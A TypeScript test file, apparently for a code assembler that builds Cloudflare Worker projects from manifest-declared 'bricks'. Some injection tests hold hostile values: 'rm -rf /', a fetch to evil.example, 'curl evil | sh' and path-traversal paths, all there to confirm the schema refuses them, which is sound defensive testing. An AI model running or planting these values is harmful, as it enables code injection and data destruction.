import { describe, expect, test, vi } from "vitest";
import { assemble, hashFiles } from "../src/index.ts";
import type { Catalog } from "../src/index.ts";
import { SUSPENSION_EXEMPT, exemptPathPattern } from "../src/assemble.ts";
import { catalog } from "../catalog.generated.ts";
import { INVOICE_FLOW_BLUEPRINT, TWO_BRICK_BLUEPRINT } from "../../../test/support/blueprints.ts";

const twoBricks = { project: "invoice-flow", bricks: ["multi-workspace", "credit-wallet"] };
const files = (input: unknown, c: Catalog = catalog) => {
  const result = assemble(input, c);
  if (!result.ok) throw new Error(result.errors.join("; "));
  return result;
};
const errors = (input: unknown, c: Catalog = catalog) => {
  const result = assemble(input, c);
  if (result.ok) throw new Error("expected the assembly to be refused");
  return result.errors;
};

describe("the two-brick blueprint", () => {
  test("produces exactly the expected files, in sorted order", () => {
    const result = files(twoBricks);
    expect(Object.keys(result.files)).toEqual([
      "migrations/0001_multi-workspace__0001_multi_workspace.sql",
      "migrations/0002_credit-wallet__0001_credit_wallet.sql",
      "migrations/0003_credit-wallet__0002_workspace_scoped_idempotency.sql",
      // Story 0.21: credit-wallet declares rate-limited routes, so the shared limiter's table comes with it.
      "migrations/0004_shell__px_rate_limits.sql",
      "openapi.json",
      "package.json",
      "project.json",
      "src/identity.stub.ts",
      "src/index.ts",
      "src/privacy.generated.ts",
      "wrangler.jsonc",
    ]);
    expect(result.order).toEqual(["multi-workspace", "credit-wallet"]);
  });

  test("two runs give identical files, byte for byte", () => {
    expect(JSON.stringify(files(twoBricks).files)).toBe(JSON.stringify(files(twoBricks).files));
  });

  test("the order the blueprint lists the bricks in does not change the project", () => {
    const reversed = { project: "invoice-flow", bricks: ["credit-wallet", "multi-workspace"] };
    expect(JSON.stringify(files(reversed).files)).toBe(JSON.stringify(files(twoBricks).files));
  });

  test("the workspace guard is mounted in front of the wallet's routes, and the wallet needs it", () => {
    const entry = files(twoBricks).files["src/index.ts"]!;
    const guard = entry.indexOf('app.use("/api/wallet", workspaceMiddleware);');
    expect(guard).toBeGreaterThan(-1);
    for (const path of ["/api/wallet", "/api/wallet/*", "/api/payments/create-order"]) expect(entry).toContain(`app.use("${path}", workspaceMiddleware);`);
    expect(entry.indexOf("app.use(\"/api/*\", stubIdentity)")).toBeLessThan(guard);
    expect(guard).toBeLessThan(entry.indexOf("createWalletRoutes({"));
    // Story 0.9: no payment gateway is wired by default; the fake is for tests that inject it.
    expect(entry).toContain('import { createWalletRoutes } from "@poc/credit-wallet";');
    expect(entry).not.toContain("createFakeGateway");
    expect(entry).toContain('import { createWorkspaceRoutes, requireNotSuspended, workspaceMiddleware } from "@poc/multi-workspace";');
    // Story 1.10: right after each workspace guard, the suspension check, and the delete route gets the purge.
    for (const path of ["/api/wallet", "/api/wallet/*", "/api/payments/create-order"]) {
      expect(entry).toContain(`app.use("${path}", workspaceMiddleware);\napp.use("${path}", notSuspended_workspace_context);`);
    }
    expect(entry).toContain("createWorkspaceRoutes({ workspaceDataPurge: purgeWorkspaceData })");
  });

  test("the migrations are in dependency order and are the bricks' own text", () => {
    const result = files(twoBricks);
    expect(result.files["migrations/0001_multi-workspace__0001_multi_workspace.sql"]).toContain("CREATE TABLE IF NOT EXISTS mw_workspaces");
    expect(result.files["migrations/0002_credit-wallet__0001_credit_wallet.sql"]).toContain("CREATE TABLE IF NOT EXISTS credit_wallets");
    expect(result.files["migrations/0002_credit-wallet__0001_credit_wallet.sql"]).toBe(catalog.bricks["credit-wallet"]!.files["migrations/0001_credit_wallet.sql"]);
  });

  test("defaults and chosen settings reach the emitted code", () => {
    expect(files(twoBricks).files["src/index.ts"]).toContain("creditsPerUnit: 1, minOrderAmount: 1");
    const configured = { project: "p", bricks: ["multi-workspace", { id: "credit-wallet", config: { creditsPerUnit: 10, minOrderAmount: 100 } }] };
    const entry = files(configured).files["src/index.ts"]!;
    expect(entry).toContain("creditsPerUnit: 10, minOrderAmount: 100");
    expect(JSON.parse(files(configured).files["project.json"]!).bricks[1].settings).toEqual({ creditsPerUnit: 10, minOrderAmount: 100 });
  });

  test("the emitted JSON files parse, and the project name and the database name agree", () => {
    const result = files(twoBricks);
    const wrangler = JSON.parse(result.files["wrangler.jsonc"]!.replace(/^\/\/.*\n/, ""));
    expect(wrangler).toMatchObject({ name: "invoice-flow", main: "src/index.ts", d1_databases: [{ binding: "DB", database_name: "invoice-flow", migrations_dir: "migrations" }] });
    expect(JSON.parse(result.files["package.json"]!)).toMatchObject({ name: "invoice-flow", dependencies: { "@poc/credit-wallet": "workspace:*", "@poc/multi-workspace": "workspace:*", hono: "4.13.19", zod: "4.6.7" } });
    expect(JSON.parse(result.files["project.json"]!).migrations).toHaveLength(4);
  });

  test("the identity stub is in the project and says it is a stub", () => {
    expect(files(twoBricks).files["src/identity.stub.ts"]).toMatch(/STUB IDENTITY/);
    expect(files(twoBricks).files["src/index.ts"]).toContain("STUB IDENTITY (proof only)");
  });

  test("one brick on its own assembles when it needs nothing", () => {
    const result = files({ project: "p", bricks: ["multi-workspace"] });
    expect(Object.keys(result.files).filter((f) => f.startsWith("migrations/"))).toHaveLength(1);
    expect(result.files["src/index.ts"]).not.toContain("createWalletRoutes");
  });
});

describe("assembly is pure", () => {
  test("it reads no clock and no random source", () => {
    const now = vi.spyOn(Date, "now").mockImplementation(() => {
      throw new Error("the assembler read the clock");
    });
    const random = vi.spyOn(Math, "random").mockImplementation(() => {
      throw new Error("the assembler used Math.random");
    });
    const uuid = vi.spyOn(globalThis.crypto, "randomUUID").mockImplementation(() => {
      throw new Error("the assembler made a random id");
    });
    try {
      expect(assemble(twoBricks, catalog).ok).toBe(true);
    } finally {
      now.mockRestore();
      random.mockRestore();
      uuid.mockRestore();
    }
  });

  test("it does not change its inputs", () => {
    const deepFreeze = <T>(value: T): T => {
      if (typeof value === "object" && value !== null) {
        Object.freeze(value);
        for (const inner of Object.values(value)) deepFreeze(inner);
      }
      return value;
    };
    const frozenCatalog = deepFreeze(structuredClone(catalog));
    const blueprint = deepFreeze(structuredClone({ project: "p", bricks: ["credit-wallet", { id: "multi-workspace", config: {} }] }));
    expect(assemble(blueprint, frozenCatalog).ok).toBe(true);
  });
});

describe("a blueprint that cannot be assembled is refused with a reason that names the problem", () => {
  test.each([
    ["an unknown brick", { project: "p", bricks: ["multi-workspace", "no-such-brick"] }, new RegExp(`unknown brick "no-such-brick" \\(available: ${Object.keys(catalog.bricks).sort().join(", ")}\\)`)],
    ["a brick listed twice", { project: "p", bricks: ["multi-workspace", "multi-workspace"] }, /"multi-workspace" is listed more than once/],
    ["the wallet without the workspace brick", { project: "p", bricks: ["credit-wallet"] }, /credit-wallet requires "workspace-context", which no enabled brick provides \(enable one of: multi-workspace\)/],
    ["an unknown setting", { project: "p", bricks: ["multi-workspace", { id: "credit-wallet", config: { creditPerUnit: 2 } }] }, /credit-wallet: unknown setting "creditPerUnit" \(known: creditsPerUnit, minOrderAmount\)/],
    ["a setting of the wrong type", { project: "p", bricks: ["multi-workspace", { id: "credit-wallet", config: { creditsPerUnit: "ten" } }] }, /setting "creditsPerUnit" must be a whole number from 1 to 1000000/],
    ["a setting below its minimum", { project: "p", bricks: ["multi-workspace", { id: "credit-wallet", config: { creditsPerUnit: 0 } }] }, /setting "creditsPerUnit" must be a whole number/],
    ["a fractional setting", { project: "p", bricks: ["multi-workspace", { id: "credit-wallet", config: { minOrderAmount: 1.5 } }] }, /setting "minOrderAmount" must be a whole number/],
    ["a setting of the wrong kind of value", { project: "p", bricks: ["multi-workspace", { id: "credit-wallet", config: { minOrderAmount: true } }] }, /setting "minOrderAmount" must be a whole number/],
    ["a setting on a brick that has none", { project: "p", bricks: [{ id: "multi-workspace", config: { x: 1 } }] }, /multi-workspace: unknown setting "x" \(known: none\)/],
  ])("%s", (_label, blueprint, message) => {
    expect(errors(blueprint).join("\n")).toMatch(message);
  });

  test.each([
    ["no bricks", { project: "p", bricks: [] }],
    ["no project name", { bricks: ["multi-workspace"] }],
    ["a project name that is a path", { project: "../escape", bricks: ["multi-workspace"] }],
    ["a project name with a quote", { project: 'p"; rm -rf /', bricks: ["multi-workspace"] }],
    ["a project name in capitals", { project: "Invoice", bricks: ["multi-workspace"] }],
    ["a project name over 40 characters", { project: "a".repeat(41), bricks: ["multi-workspace"] }],
    ["an identity other than the stub", { project: "p", bricks: ["multi-workspace"], identity: "jwt" }],
    ["a key the blueprint does not define", { project: "p", bricks: ["multi-workspace"], owner: "bob" }],
    ["a brick id with a path in it", { project: "p", bricks: ["../multi-workspace"] }],
    ["not an object", "multi-workspace"],
    ["null", null],
  ])("%s is refused by the blueprint check", (_label, blueprint) => {
    const result = assemble(blueprint, catalog);
    expect(result.ok).toBe(false);
  });

  test("every problem is reported at once, not only the first", () => {
    const list = errors({ project: "p", bricks: ["credit-wallet", "ghost", { id: "credit-wallet", config: {} }] });
    expect(list.length).toBeGreaterThanOrEqual(2);
  });

  test("rejects declared conflicting brick pairs in the catalog", () => {
    expect(
      errors({
        project: "p",
        bricks: ["multi-workspace", "document-parsing", "document-pdf"],
      }).join("\n"),
    ).toBe("conflict: document-parsing × document-pdf: Both export route factory createDocumentRoutes in the documents domain");

    expect(
      errors({
        project: "p",
        bricks: ["multi-workspace", "outbound-webhooks", "subscription-plans"],
      }).join("\n"),
    ).toBe("conflict: outbound-webhooks × subscription-plans: Both mount routes under the /api/subscriptions prefix");
  });
});

// The manifest is data the assembler turns into source text, so it is checked as hostile input. The synthetic bricks
// below stand in for bricks that do not exist yet; they test the ordering and refusal logic that the two real bricks
// (one depends on the other, nothing deeper) cannot.
const brick = (id: string, extra: Partial<Catalog["bricks"][string]["manifest"]> = {}, files: Record<string, string> = {}): Catalog["bricks"][string] => ({
  manifest: { manifestVersion: 2, kind: "brick", id, version: "1.0.0", trust: "first-party", isolation: "none", provides: [], requires: [], migrations: [], routePrefixes: [], npmDependencies: {}, settings: {}, worker: { package: `@x/${id}`, routes: [] }, ...extra },
  files,
});
const catalogOf = (...bricks: Array<Catalog["bricks"][string]>): Catalog => ({ bricks: Object.fromEntries(bricks.map((b) => [b.manifest.id, b])) });

describe("ordering and refusal with synthetic bricks", () => {
  const chain = catalogOf(
    brick("alpha", { requires: ["cap-b"], migrations: ["migrations/a.sql"] }, { "migrations/a.sql": "-- a" }),
    brick("bravo", { provides: ["cap-b"], requires: ["cap-c"], migrations: ["migrations/b.sql"] }, { "migrations/b.sql": "-- b" }),
    brick("charlie", { provides: ["cap-c"], migrations: ["migrations/c.sql"] }, { "migrations/c.sql": "-- c" }),
  );

  test("a chain is mounted from the deepest provider outwards, whatever order it was listed in", () => {
    for (const listed of [["alpha", "bravo", "charlie"], ["charlie", "alpha", "bravo"], ["bravo", "charlie", "alpha"]]) {
      const result = files({ project: "p", bricks: listed }, chain);
      expect(result.order).toEqual(["charlie", "bravo", "alpha"]);
      expect(Object.keys(result.files).filter((f) => f.startsWith("migrations/"))).toEqual([
        "migrations/0001_charlie__c.sql",
        "migrations/0002_bravo__b.sql",
        "migrations/0003_alpha__a.sql",
      ]);
    }
  });

  test("bricks with no dependency between them are ordered by id", () => {
    const c = catalogOf(brick("zulu"), brick("mike"), brick("echo"));
    expect(files({ project: "p", bricks: ["zulu", "mike", "echo"] }, c).order).toEqual(["echo", "mike", "zulu"]);
  });

  test("a dependency cycle is refused and names the bricks", () => {
    const c = catalogOf(brick("one", { provides: ["cap-1"], requires: ["cap-2"] }), brick("two", { provides: ["cap-2"], requires: ["cap-1"] }));
    expect(errors({ project: "p", bricks: ["one", "two"] }, c).join()).toMatch(/cycle: one, two/);
  });

  test("two bricks providing the same capability are refused", () => {
    const c = catalogOf(brick("left", { provides: ["cap-x"] }), brick("right", { provides: ["cap-x"] }));
    expect(errors({ project: "p", bricks: ["left", "right"] }, c).join()).toMatch(/"cap-x" is provided by both left and right/);
  });

  test("two bricks declaring a conflict are refused with conflict: <a> × <b>: <reason>", () => {
    const c = catalogOf(
      brick("alpha", { conflicts: [{ brick: "bravo", reason: "Both mount /api/shared" }] }),
      brick("bravo"),
    );
    expect(errors({ project: "p", bricks: ["bravo", "alpha"] }, c)).toEqual([
      "conflict: alpha × bravo: Both mount /api/shared",
    ]);
  });

  test("a brick that provides a capability it also requires does not wait on itself", () => {
    const c = catalogOf(brick("self", { provides: ["cap-s"], requires: ["cap-s"] }));
    expect(files({ project: "p", bricks: ["self"] }, c).order).toEqual(["self"]);
  });

  test("two bricks that need different versions of a package are refused", () => {
    const c = catalogOf(brick("one", { npmDependencies: { hono: "4.13.13" } }), brick("two", { npmDependencies: { hono: "4.12.0" } }));
    expect(errors({ project: "p", bricks: ["one", "two"] }, c).join()).toMatch(/hono is needed at 4.13.13 and at 4.12.0/);
  });

  test("a brick that lists a migration the catalog does not hold is refused", () => {
    const c = catalogOf(brick("lost", { migrations: ["migrations/missing.sql"] }));
    expect(errors({ project: "p", bricks: ["lost"] }, c).join()).toMatch(/lost lists migration migrations\/missing.sql, which is not in the catalog/);
  });

  test("a capability offered without a guard cannot guard a route", () => {
    const c = catalogOf(
      brick("offers", { provides: ["cap-g"] }),
      brick("uses", { requires: ["cap-g"], worker: { package: "@x/uses", routes: [{ factory: "makeRoutes", mountAt: "/api", options: {}, guardPaths: ["/api/x"], guardWith: "cap-g" }] } }),
    );
    expect(errors({ project: "p", bricks: ["offers", "uses"] }, c).join()).toMatch(/uses guards makeRoutes with "cap-g", but offers offers that capability without a guard to mount/);
  });

  test("the emitted code for a synthetic brick uses only what its manifest declares", () => {
    const c = catalogOf(
      brick("guarded", { provides: ["cap-g"], worker: { package: "@x/guarded", guard: { export: "guardIt", capability: "cap-g" }, routes: [] } }),
      brick("routes", {
        requires: ["cap-g"],
        settings: { limit: { type: "integer", min: 1, max: 9, default: 3 } },
        worker: { package: "@x/routes", routes: [{ factory: "makeRoutes", mountAt: "/api/things", options: { limit: { $setting: "limit" }, label: "hello", on: true, store: { $call: "makeStore" } }, guardPaths: ["/api/things"], guardWith: "cap-g" }] },
      }),
    );
    const entry = files({ project: "p", bricks: ["routes", "guarded"] }, c).files["src/index.ts"]!;
    expect(entry).toContain('import { guardIt } from "@x/guarded";');
    expect(entry).toContain('import { makeRoutes, makeStore } from "@x/routes";');
    expect(entry).toContain('app.use("/api/things", guardIt);');
    expect(entry).toContain('app.route("/api/things", makeRoutes({ limit: 3, label: "hello", on: true, store: makeStore() }));');
  });
});

describe("a manifest cannot smuggle code into the emitted project", () => {
  const withRoute = (route: Record<string, unknown>) =>
    ({ manifestVersion: 2, kind: "brick", id: "evil", version: "1.0.0", trust: "first-party", provides: [], requires: [], migrations: [], npmDependencies: {}, settings: {}, worker: { package: "@x/evil", routes: [route] } }) as never;
  const parse = async (manifest: unknown) => (await import("../src/schemas.ts")).ManifestSchema.safeParse(manifest).success;

  test.each([
    ["a factory name that ends the call and starts another", { factory: "x); fetch('https://evil.example'); (y", mountAt: "/api" }],
    ["a mount path that closes the string", { factory: "x", mountAt: '/api"); evil(); ("' }],
    ["a mount path with a space", { factory: "x", mountAt: "/api /x" }],
    ["a $call that is not an identifier", { factory: "x", mountAt: "/api", options: { a: { $call: "x(); y" } } }],
    ["an option name that is not an identifier", { factory: "x", mountAt: "/api", options: { "a: evil()": 1 } }],
    ["a $setting that names nothing declared", { factory: "x", mountAt: "/api", options: { a: { $setting: "ghost" } } }],
    ["a guard path with a newline", { factory: "x", mountAt: "/api", guardWith: "cap", guardPaths: ["/a\nevil()"] }],
    ["guard paths without a capability", { factory: "x", mountAt: "/api", guardPaths: ["/api/x"] }],
  ])("%s is refused", async (_label, route) => {
    expect(await parse(withRoute(route))).toBe(false);
  });

  test.each([
    ["a package name with a quote", { worker: { package: '@x/evil"', routes: [] } }],
    ["a package name that climbs out", { worker: { package: "../evil", routes: [] } }],
    ["a migration path that climbs out", { migrations: ["../../secrets.sql"] }],
    ["a migration that is not SQL", { migrations: ["migrations/run.sh"] }],
    ["a dependency at a range, not an exact version", { npmDependencies: { hono: "^4.0.0" } }],
    ["a brick id in capitals", { id: "Evil" }],
    ["an unknown key", { postInstall: "curl evil | sh" }],
    ["a v1 manifest without manifestVersion", { manifestVersion: undefined }],
    ["a v1 manifest with manifestVersion 1", { manifestVersion: 1 }],
    ["a manifest with wrong kind", { kind: "node-pack" }],
    ["a ui summary over 140 characters", { ui: { displayName: "Valid Name", category: "billing", summary: "a".repeat(141) } }],
    ["a ui category outside the closed enum", { ui: { displayName: "Valid Name", category: "unknown-cat", summary: "Short summary." } }],
    ["a ui behaviourTest with path traversal", { ui: { displayName: "Valid Name", category: "billing", summary: "Short summary.", behaviourTest: "../escape.test.ts" } }],
    ["a trigger handler that is not an identifier", { triggers: { schedules: [{ id: "tick", cron: "* * * * *", handler: "run(); evil" }] } }],
    ["a conflict brick id that is invalid", { conflicts: [{ brick: "../evil", reason: "Bad id" }] }],
  ])("%s is refused", async (_label, change) => {
    const base = { manifestVersion: 2, kind: "brick", id: "evil", version: "1.0.0", trust: "first-party", provides: [], requires: [], migrations: [], npmDependencies: {}, settings: {}, worker: { package: "@x/evil", routes: [] } };
    expect(await parse({ ...base, ...change })).toBe(false);
  });

  test("accepts valid v2 ui, triggers, conflicts, bindings, secrets and globalTables blocks", async () => {
    const valid = {
      manifestVersion: 2,
      kind: "brick",
      id: "sample-brick",
      version: "1.0.0",
      trust: "first-party",
      provides: [],
      requires: [],
      migrations: [],
      npmDependencies: {},
      settings: {},
      ui: {
        displayName: "Sample Brick",
        category: "billing",
        summary: "Handles billing operations within 140 chars.",
        maturity: "production",
        behaviourTest: "test/sample.test.ts",
      },
      triggers: {
        schedules: [{ id: "every-min", cron: "* * * * *", handler: "runTick" }],
        queues: [{ id: "job-queue", handler: "handleBatch", maxBatch: 10, dlq: true }],
      },
      conflicts: [{ brick: "other-brick", reason: "Shares the same route table." }],
      bindings: { BUCKET: "r2" },
      secrets: ["API_SECRET_KEY"],
      globalTables: [{ table: "global_lookup", reason: "Shared reference table across all workspaces." }],
      worker: { package: "@x/sample-brick", routes: [] },
    };
    expect(await parse(valid)).toBe(true);
  });
});

describe("triggers emission and byte-identical baseline when no triggers are declared (AC 1)", () => {
  test("TWO_BRICK_BLUEPRINT and INVOICE_FLOW_BLUEPRINT emit byte-identical files and hashes when no triggers are present", async () => {
    const twoBrickHashes = await hashFiles(files(TWO_BRICK_BLUEPRINT).files);
    expect(twoBrickHashes).toEqual({
      "migrations/0001_multi-workspace__0001_multi_workspace.sql": "44330d96d93fc7c48c859437e2f78c3ec8daea0381cfab30c94fa80cb0bcaaef",
      "migrations/0002_credit-wallet__0001_credit_wallet.sql": "29c4056af349d76717f8a1777b58e5bfc09838af60e676f96051a811e3571bfc",
      "migrations/0003_credit-wallet__0002_workspace_scoped_idempotency.sql": "6274abf0fb0de6ab68cf97d00ccf245cbb67fa0f7a319b5012e60cbec682bead",
      // Story 0.21: credit-wallet declares rate limits, so three hashes changed: the limiter's table (new), project.json
      // (which lists it) and the entry (the app.on(..., rateLimit(...)) lines). Every other file is as before.
      "migrations/0004_shell__px_rate_limits.sql": "6828c5012c0036c30563305d8200214fbdccf995ed59506bcaf9464195d63e3a",
      "openapi.json": "c77c2e7c33606f6a369cf1b1a90809da38adaa3a5145d15159f30fb704c49487",
      "package.json": "24d1388075ec69744a13f379f37b38441588d2cdb511352eb58f6ab9d0e1a946",
      "project.json": "a89688bddaf9e606d383364a7a2b06a7069763437fea127ef64963f24986a56d",
      "src/identity.stub.ts": "f6f7e26885eca9904d03068a7f72620808ab584ee1a66c8b41af7e04fd3907f3",
      // Story 1.10: only the entry changed (the workspace-data purge, the suspension check and its app.use lines).
      "src/index.ts": "8fa5ab3e62b73cfebdffb9753e3ed8def2d0e9abbf5f1a5f4911345ed86f79fe",
      "src/privacy.generated.ts": "a029b2ce67225928903d85b59be098fd44f1d04384f286178f42a3715d19d396",
      "wrangler.jsonc": "d678c83f4dd70ff4bfc1dc7e2e75953a9a8d0e0216061d82308bd562c1f4625b",
    });

    const invoiceFlowHashes = await hashFiles(files(INVOICE_FLOW_BLUEPRINT).files);
    expect(invoiceFlowHashes).toEqual({
      "migrations/0001_multi-workspace__0001_multi_workspace.sql": "44330d96d93fc7c48c859437e2f78c3ec8daea0381cfab30c94fa80cb0bcaaef",
      "migrations/0002_credit-wallet__0001_credit_wallet.sql": "29c4056af349d76717f8a1777b58e5bfc09838af60e676f96051a811e3571bfc",
      "migrations/0003_credit-wallet__0002_workspace_scoped_idempotency.sql": "6274abf0fb0de6ab68cf97d00ccf245cbb67fa0f7a319b5012e60cbec682bead",
      "migrations/0004_entity__invoices.sql": "43c67676212cbfd376e0479b1fe3e955c054eb127b09e84ad0922012e1a445ff",
      "migrations/0005_shell__px_rate_limits.sql": "6828c5012c0036c30563305d8200214fbdccf995ed59506bcaf9464195d63e3a",
      "openapi.json": "fc78a27cbc505836cef15723d4c63e5feed04a53f4071a2ef1f7868d8a7fe902",
      "package.json": "95f5732b726396206cd43cc4916b7dcd19b5519f4c31ba4ac0996a1a3edb8e4f",
      "project.json": "444740d44ba274af64c0e12ecdeccb3f1ff86687374cf529b53f0f4ca22fb8bf",
      "src/entities.json": "5b153446783e693c0ada62b9c2626071e38f3e3e9bb047dd5a3a39c24179ba0a",
      "src/identity.stub.ts": "f6f7e26885eca9904d03068a7f72620808ab584ee1a66c8b41af7e04fd3907f3",
      // Story 1.10: only the entry changed (purge, including the declared entity's table, and the suspension check).
      "src/index.ts": "8244f09363dad6775017104ed97194c8af56395b8d778c5555b367eaea62ad89",
      "src/privacy.generated.ts": "5c0f6d193d3f6d332a415d2cfa7b9e571bdf3b6ca71f8ae177e053227170e804",
      "wrangler.jsonc": "d7c0046626c2da81eca662bc64f38619da75b0d48f4978b1dc37ecf5eb8c3c0b",
    });
  });

  test("story 0.21 NO_RULES_BLUEPRINT: a blueprint whose bricks declare no rate limits assembles byte-identical to before the limiter", async () => {
    // Hashes recorded from the assembler at the story's baseline revision (16ee1eb), before rateLimits existed.
    // (edge-traffic-armor is left out: since story 0.21 it ships the px_rate_limits table as its own migration.)
    const noRules = files({ project: "no-rules", bricks: ["multi-workspace", "audit-trail", "cron-alarms"] });
    expect(noRules.files["src/index.ts"]).not.toContain("rateLimit");
    expect(Object.keys(noRules.files).some((f) => f.includes("px_rate_limits"))).toBe(false);
    expect(await hashFiles(noRules.files)).toEqual({
      "migrations/0001_multi-workspace__0001_multi_workspace.sql": "44330d96d93fc7c48c859437e2f78c3ec8daea0381cfab30c94fa80cb0bcaaef",
      "migrations/0002_audit-trail__0001_audit_trail.sql": "d1d8192cea9a17cc12dde86feb5288e361625590e2c0db652a74edfba10a73a2",
      "migrations/0003_cron-alarms__0001_cron_alarms.sql": "95631dcb80615aee290bfe058373b28e21881d6409b339709670e034ae062926",
      "migrations/0004_cron-alarms__0002_catch_up.sql": "4d7aa86c89511f06dbf65e841ce31bb7f84d825da41d3317bb84a21921f52011",
      "migrations/0005_shell__px_schedules.sql": "5876bb9226cf588bb29d757b10c46b24ed970f60e1d0964964b734285e11e752",
      "openapi.json": "c3964d819bb933d81d0c6e576db76ab8e01a0c3ff8ce7ebc94b36d87b7f8956c",
      "package.json": "674a79407b61b5947fa4ed7fa2e190c5ac39a255ca61b47ec6b6097d37aff6ea",
      "project.json": "2115551c1b468de5bb4ceb23c44d6e348790b307265fefa91329cff9b40db02d",
      "src/identity.stub.ts": "f6f7e26885eca9904d03068a7f72620808ab584ee1a66c8b41af7e04fd3907f3",
      "src/index.ts": "55c1cb50d7e827ed559b81f4c84c969d34e7b65e621fc6a7464083daa8b2e09c",
      "src/privacy.generated.ts": "7f4322f58ee6a55f3804d2083a792725f779a951b2694709249a8e20159bfe3d",
      "wrangler.jsonc": "85a0ab37dcde7ee01d8eba1e1549a27580973cbc6620000388435027176f298c",
    });
  });

  test("story 0.21: a brick's rateLimits are mounted with the SDK limiter after its guards and before its routes, and add the px_rate_limits migration", () => {
    const c = catalogOf(
      brick("guard-brick", { provides: ["workspace-context"], worker: { package: "@x/guard-brick", guard: { export: "wsGuard", capability: "workspace-context" }, routes: [] } }),
      brick("limited-brick", {
        requires: ["workspace-context"],
        routePrefixes: ["things"],
        rateLimits: [
          { method: "POST", path: "/things/:thingId/poke", bucket: "things-poke", limit: 7, windowSeconds: 60, key: "param:thingId" },
          { method: "POST", path: "/things/login", bucket: "auth-things", limit: 3, windowSeconds: 600, key: "field:email", failClosed: true },
        ],
        worker: {
          package: "@x/limited-brick",
          routes: [{ factory: "createThings", mountAt: "/api", options: {}, guardWith: "workspace-context", guardPaths: ["/api/things/*"] }],
        },
      }),
    );
    const out = files({ project: "limited-app", bricks: ["guard-brick", "limited-brick"] }, c);
    const entry = out.files["src/index.ts"]!;
    expect(entry).toContain('import { createHttpGuard, rateLimit } from "@poc/sdk";');
    const poke = entry.indexOf('app.on("POST", "/api/things/:thingId/poke", rateLimit({"bucket":"things-poke","limit":7,"windowSeconds":60,"key":"param:thingId"}));');
    const login = entry.indexOf('app.on("POST", "/api/things/login", rateLimit({"bucket":"auth-things","limit":3,"windowSeconds":600,"key":"field:email","failClosed":true}));');
    expect(poke).toBeGreaterThan(-1);
    expect(login).toBeGreaterThan(poke);
    expect(entry.indexOf('app.use("/api/things/*", wsGuard);')).toBeGreaterThan(-1);
    expect(entry.indexOf('app.use("/api/things/*", wsGuard);')).toBeLessThan(poke);
    expect(login).toBeLessThan(entry.indexOf('app.route("/api", createThings('));
    expect(Object.keys(out.files).filter((k) => k.startsWith("migrations/"))).toEqual(["migrations/0001_shell__px_rate_limits.sql"]);
    expect(out.files["migrations/0001_shell__px_rate_limits.sql"]).toContain("CREATE TABLE IF NOT EXISTS px_rate_limits");
    expect(JSON.stringify(files({ project: "limited-app", bricks: ["limited-brick", "guard-brick"] }, c).files)).toBe(JSON.stringify(out.files));
  });

  test("story 0.21: with several routes, every guard of the brick comes before its limiter, and rule paths use the brick's mount", () => {
    const c = catalogOf(
      brick("guard-brick", { provides: ["workspace-context"], worker: { package: "@x/guard-brick", guard: { export: "wsGuard", capability: "workspace-context" }, routes: [] } }),
      brick("two-route-brick", {
        requires: ["workspace-context"],
        routePrefixes: ["alpha", "beta"],
        rateLimits: [{ method: "POST", path: "/beta/buy", bucket: "beta-buy", limit: 5, windowSeconds: 60, key: "workspace" }],
        worker: {
          package: "@x/two-route-brick",
          routes: [
            { factory: "createAlpha", mountAt: "/v2", options: {}, guardWith: "workspace-context", guardPaths: ["/v2/alpha/*"] },
            { factory: "createBeta", mountAt: "/v2", options: {}, guardWith: "workspace-context", guardPaths: ["/v2/beta/*"] },
          ],
        },
      }),
    );
    const entry = files({ project: "two-route-app", bricks: ["guard-brick", "two-route-brick"] }, c).files["src/index.ts"]!;
    const limiter = entry.indexOf('app.on("POST", "/v2/beta/buy", rateLimit(');
    expect(limiter).toBeGreaterThan(-1);
    expect(entry.indexOf('app.use("/v2/alpha/*", wsGuard);')).toBeLessThan(limiter);
    expect(entry.indexOf('app.use("/v2/beta/*", wsGuard);')).toBeLessThan(limiter);
    expect(limiter).toBeLessThan(entry.indexOf('app.route("/v2", createAlpha('));
    expect(limiter).toBeLessThan(entry.indexOf('app.route("/v2", createBeta('));
  });

  test("story 0.21: the manifest schema refuses a rateLimits entry with a non-positive number, an unknown key or a bad path", async () => {
    const { ManifestSchema } = await import("../src/schemas.ts");
    const manifest = (rule: Record<string, unknown>) => ({
      manifestVersion: 2,
      kind: "brick",
      id: "rl-brick",
      version: "1.0.0",
      trust: "first-party",
      routePrefixes: ["things"],
      rateLimits: [{ method: "POST", path: "/things/:id", bucket: "things-x", limit: 1, windowSeconds: 60, key: "ip", ...rule }],
      worker: { package: "@x/rl-brick", routes: [] },
    });
    expect(ManifestSchema.safeParse(manifest({})).success).toBe(true);
    expect(ManifestSchema.safeParse(manifest({ key: "param:id", failClosed: true })).success).toBe(true);
    for (const rule of [{ limit: 0 }, { windowSeconds: -1 }, { limit: 1.5 }, { key: "cookie:session" }, { path: "things" }, { path: "/things/../x" }, { method: "TRACE" }]) {
      expect(ManifestSchema.safeParse(manifest(rule)).success, JSON.stringify(rule)).toBe(false);
    }
  });

  test("emits one Cron Trigger (* * * * *), px_schedules migration,scheduled() dispatcher, queue bindings, and queue(batch) dispatcher when bricks declare triggers", () => {
    const c = catalogOf(
      brick(
        "sched-brick",
        {
          migrations: ["migrations/0001_sched.sql"],
          triggers: {
            schedules: [
              { id: "sweep-a", cron: "*/5 * * * *", handler: "handleSweepA" },
              { id: "sweep-b", cron: "0 * * * *", handler: "handleSweepB" },
            ],
          },
        },
        { "migrations/0001_sched.sql": "-- sched" },
      ),
      brick("queue-brick", {
        triggers: {
          queues: [
            { id: "alpha-jobs", handler: "consumeAlpha", maxBatch: 15, dlq: true },
            { id: "beta-jobs", handler: "consumeBeta", maxBatch: 5, dlq: false },
          ],
        },
      }),
    );

    const out = files({ project: "triggered-app", bricks: ["sched-brick", "queue-brick"] }, c);
    expect(Object.keys(out.files).filter((k) => k.startsWith("migrations/"))).toEqual([
      "migrations/0001_sched-brick__0001_sched.sql",
      "migrations/0002_shell__px_schedules.sql",
    ]);
    expect(out.files["migrations/0002_shell__px_schedules.sql"]).toContain("CREATE TABLE IF NOT EXISTS px_schedules");

    const wrangler = JSON.parse(out.files["wrangler.jsonc"]!.replace(/^\/\/.*\n/, ""));
    expect(wrangler.triggers).toEqual({ crons: ["* * * * *"] });
    expect(wrangler.queues).toEqual({
      producers: [
        { binding: "ALPHA_JOBS", queue: "alpha-jobs" },
        { binding: "BETA_JOBS", queue: "beta-jobs" },
      ],
      consumers: [
        { queue: "alpha-jobs", max_batch_size: 15, dead_letter_queue: "alpha-jobs-dlq" },
        { queue: "beta-jobs", max_batch_size: 5 },
      ],
    });

    const entry = out.files["src/index.ts"]!;
